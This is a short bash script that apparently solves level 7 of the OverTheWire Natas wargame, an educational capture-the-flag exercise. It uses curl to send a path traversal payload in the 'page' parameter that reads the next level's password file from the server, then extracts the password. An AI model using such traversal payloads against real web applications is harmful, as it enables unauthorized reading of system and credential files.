#!/bin/bash
url="http://natas7.natas.labs.overthewire.org"
user="natas7"
pass=$(cat credentials/natas7)

path="./../../../../etc/natas_webpass/natas8"
curl -s -u "$user:$pass" "$url?page=$path" | html2text | xargs echo -n | awk '{print $5}'


